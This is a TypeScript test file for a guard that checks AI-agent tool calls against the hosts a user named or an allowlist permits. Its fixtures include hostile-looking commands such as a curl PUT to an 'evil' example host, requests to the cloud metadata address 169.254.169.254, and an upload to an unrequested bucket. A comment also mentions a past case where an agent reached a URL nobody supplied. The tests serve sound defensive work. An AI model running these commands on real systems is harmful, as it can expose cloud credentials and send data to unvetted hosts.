// Cases ported from SafeAgents tests/test_policy.py (commit a8ee22d; Copyright 2026 the HuggingFace Inc. team,
// Apache License 2.0), with the same inputs and expectations.
import { expect, test } from "bun:test";
import { bashRequest, OSS } from "./fixtures";
import { DEFAULT_ALLOWED_HOSTS, RequestPolicy, declaredTools, extractHosts } from "../../../src/server/tool-guard/policy";

test("declared tools are read from both formats", () => {
  expect([...declaredTools({ tools: [{ type: "function", function: { name: "read_file" } }] })]).toEqual(["read_file"]);
  expect([...declaredTools({ tools: [{ name: "get_weather", input_schema: {} }] })]).toEqual(["get_weather"]);
});

test("URL hosts and bare IPs are extracted", () => {
  const text = '{"cmd": "curl -X PUT https://user:pw@Evil.Example.com:8443/x && curl 169.254.169.254/latest; cat file:///etc/hosts"}';
  expect(extractHosts(text)).toEqual(["169.254.169.254", "evil.example.com"]);
  expect(extractHosts("pip install torch==2.5.1 && ls ./src/main.rs")).toEqual([]);
  expect(extractHosts("version 1.2.3.4.5 and 999.1.1.1")).toEqual([]);
});

test("a declared tool reaching an unseen host is blocked", () => {
  // The Cohere case: `bash` is declared, but the bucket URL came from nowhere.
  const policy = new RequestPolicy(bashRequest("Write a detection rule for curl downloads to /tmp."));
  expect(policy.check("bash", `{"cmd": "curl -o /tmp/put_probe -X PUT --data-binary PROBE https://${OSS}/probe"}`)).toContain(OSS);
  expect(policy.check("bash", '{"cmd": "curl http://169.254.169.254/latest/meta-data/"}')).toBeTruthy();
  expect(policy.check("shell", "{}")).toBe("undeclared tool");
});

test("a host from the user or the allowlist is fine", () => {
  const policy = new RequestPolicy(bashRequest("Download https://data.example.org/file.csv please"), DEFAULT_ALLOWED_HOSTS);
  expect(policy.check("bash", '{"cmd": "curl -O https://data.example.org/file.csv"}')).toBeNull();
  expect(policy.check("bash", '{"cmd": "git clone https://github.com/huggingface/transformers"}')).toBeNull();
  expect(policy.check("bash", '{"cmd": "curl http://localhost:8080/health"}')).toBeNull();
});

test("a host only in the model's own turns does not count", () => {
  const request = bashRequest("hi");
  request.messages.push({ role: "assistant", content: `I will use https://${OSS}` });
  expect(new RequestPolicy(request).check("bash", `curl https://${OSS}/x`)).toBeTruthy();
});

test("a host in written data is fine", () => {
  // From training rollouts that were blocked: URLs and IPs a call writes as data, with no request made.
  const request = bashRequest("Write a CLF log parser and a click log generator, with tests.");
  request.tools.push({ type: "function", function: { name: "write" } });
  const policy = new RequestPolicy(request);
  const line = String.raw`10.0.0.1 - bob [10/Oct/2000:13:55:36 -0700] \"GET /a HTTP/1.0\" 200 5 \"http://x.com\" \"curl/7.68.0\"`;
  expect(policy.check("write", String.raw`{"path": "test_clf.py", "content": "LINE = \"${line}\""}`)).toBeNull();
  expect(policy.check("bash", String.raw`{"command": "printf 'user_000,2026-08-01T00:00:00Z,http://a.com\\n' > clicks.csv"}`)).toBeNull();
  expect(policy.check("write", '{"content": "# see http://home.online.no/~pjacklam/notes/invnorm/"}')).toBeNull();
  expect(policy.check("bash", '{"command": "python3 -m http.server 8080 --bind 0.0.0.0 &"}')).toBeNull();
});

test("reserved hosts are fine and requests are still checked", () => {
  const policy = new RequestPolicy(bashRequest("hi"), []);
  expect(policy.check("bash", '{"cmd": "curl https://click.example.com/x https://example.org"}')).toBeNull();
  expect(policy.check("bash", String.raw`{"cmd": "python -c \"import requests; requests.get('https://www.google.com/search?q=task')\""}`)).toBeTruthy();
  expect(policy.check("web_fetch", '{"url": "https://en.wikipedia.org/wiki/Genetic_code"}')).toBe("undeclared tool");
  const request = bashRequest("hi");
  request.tools.push({ type: "function", function: { name: "web_extract" } });
  expect(new RequestPolicy(request).check("web_extract", '{"urls": ["https://fineenvs-rl-explorer.hf.space/t/x"]}')).toBeTruthy();
});

test("IPs in fixtures beside a request are fine", () => {
  // From training rollouts that were blocked: an escaped newline before `cat` read as `ncat`, and IPs in a log
  // fixture (or a version pin) taken for addresses because the same call also made a request.
  const policy = new RequestPolicy(bashRequest("Write a log summariser for /app/logs."));
  const fixture = "cat > a.log <<'EOF'\n1.2.3.4 - - [07/Nov/2020:01:30:00 -0700] \"GET /x HTTP/1.0\" 200 1\nEOF\n./summarise a.log";
  expect(policy.check("bash", JSON.stringify({ command: fixture }))).toBeNull();
  expect(policy.check("bash", JSON.stringify({ command: `curl -s http://localhost:8080/health\n${fixture}` }))).toBeNull();
  expect(policy.check("bash", JSON.stringify({ command: "pip install t-digest==0.5.1.4" }))).toBeNull();
  expect(policy.check("bash", JSON.stringify({ command: "curl -s http://10.9.8.7/x" }))).toBeTruthy();
  expect(policy.check("bash", JSON.stringify({ command: "import urllib.request\nURL = 'https://reveng.online/a.json'" }))).toBeTruthy();
});
